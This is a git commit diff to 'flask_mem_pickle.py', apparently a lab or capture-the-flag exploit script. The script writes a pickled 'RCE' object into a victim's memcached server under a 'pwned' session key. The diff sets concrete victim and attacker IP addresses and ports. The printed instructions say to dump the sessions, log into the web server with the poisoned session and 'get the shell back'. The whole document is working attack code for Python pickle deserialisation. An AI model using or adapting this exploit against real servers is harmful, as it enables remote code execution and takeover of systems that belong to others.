bcadefa3e6f18f227c1a487a26cb328cb5dd8f49
Astik Rawat <35935843+ahrixia@users.noreply.github.com>
2021-08-19 08:36:26 +0530

    Update flask_mem_pickle.py

--- flask_mem_pickle.py
+++ flask_mem_pickle.py
@@ -9,8 +9,9 @@ from pymemcache.exceptions import (
  
 MC_ERR = (MemcacheError, MemcacheClientError, MemcacheServerError, MemcacheUnknownError)
  
-victim = "192.168.xx.xx"
-attacker = "192.168.xx.xx"
+victim = "192.168.235.59"
+victim_port = 11211
+attacker = "192.168.49.235"
 attacker_port = 11211
  
 class RCE:
@@ -21,9 +22,9 @@ class RCE:
  
 if __name__ == '__main__':
     try:
-        mc = Client(f"{victim}:11211")
+        mc = Client(f"{victim}:{victim_port}")
         mc.set("session:you_have_been_pwned", pickle.dumps(RCE()))
-        print ("[*]Done! Sent payload")
+        print ("[*]Payload Sent!")
         print (f"[*]NOW RUN 'memcdump --servers= {victim}' And look for new pwned session.\n[*]Then just log into the web server with pwned session and get the shell back.")   
     except MC_ERR as e:
         print(e)
